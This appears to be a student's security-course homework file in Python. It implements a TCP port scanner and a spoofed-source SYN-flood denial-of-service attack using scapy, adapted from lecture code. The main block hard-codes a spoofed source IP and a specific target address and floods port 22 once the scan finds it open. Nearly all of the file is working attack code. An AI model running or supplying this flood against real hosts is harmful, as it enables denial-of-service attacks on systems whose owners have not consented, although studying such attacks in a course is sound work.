# Homework Number: hw8
# Name: Jiaxing Yang
# ECN Login: yang1274
# Due Date: 3/26/2020




import sys, socket
from scapy.all import *



#This is from the lecture downloaded code

"""
for i in range(count):                                                       #(5)
    IP_header = IP(src = srcIP, dst = destIP)                                #(6)
    TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
    packet = IP_header / TCP_header                                          #(8)
    try:                                                                     #(9)
       send(packet)                                                          #(10)
    except Exception as e:                                                   #(11)
       print e                                                          #(11)


"""
"""
open_ports = []                                                              #(5)
# Scan the ports in the specified range:
for testport in range(start_port, end_port+1):                               #(6)
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
    sock.settimeout(0.1)                                                     #(8)
    try:                                                                     #(9)
        sock.connect( (dst_host, testport) )                                 #(10)
        open_ports.append(testport)                                          #(11)
        if verbosity: print testport                                         #(12)
        sys.stdout.write("%s" % testport)                                    #(13)
        sys.stdout.flush()                                                   #(14)
    except:                                                                  #(15)
        if verbosity: print "Port closed: ", testport                        #(16)
        sys.stdout.write(".")                                                #(17)
        sys.stdout.flush()                                                   #(18)




"""
#rangeStart:
class TcpAttack:
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        self.srcIP = spoofIP
        self.destIP = targetIP

        #init the open_ports here
        self.open_ports = []

    # rangeStart: Integer designating the first port in the range of ports being scanned.
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # No return value, but writes open ports to openports.txt

    #port scan
    def scanTarget(self, rangeStart, rangeEnd):
        file_out = open("openports.txt", "w")
        for port in range(rangeStart, rangeEnd+1):

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:  # (9)
                sock.connect((self.destIP, port))  # (10)
                self.open_ports.append(port)  # (11)
            except:  # (15)
                pass


        for port in self.open_ports:
            file_out.write(str(port) + "\n")

        file_out.close()

    # port: Integer designating the port that the attack will use
    # numSyn: Integer of SYN packets to send to target IP address at the given port
    # If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self, port, numSyn):
        if port not in self.open_ports:
            return 0

        for num in range(numSyn):
            #this is from lecture
            IP_header = IP(src=self.srcIP, dst=self.destIP)  # (6)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)  # (7)
            packet = IP_header / TCP_header  # (8)
            try:
                send(packet)
            except Exception as e:
                print(e)

        return 1



if __name__ == '__main__':

    spoofIP = "233.233.233.233"

    targetIP = "128.46.4.86"

    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(0, 255)
    if(Tcp.attackTarget(22, 10)):
        print('port was open to attack')